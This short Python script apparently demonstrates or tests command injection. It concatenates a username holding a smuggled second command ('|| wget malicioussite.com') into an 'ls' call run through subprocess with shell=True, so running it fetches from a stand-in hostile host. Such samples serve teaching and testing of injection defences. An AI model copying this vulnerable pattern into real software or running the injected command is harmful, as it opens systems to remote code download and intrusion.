import os
import subprocess

username = 'testUser || wget malicioussite.com'


def execute(arg):
    return subprocess.Popen(arg, shell=True)


result = str(execute('ls -lsa ' + username))


assert(len(result))
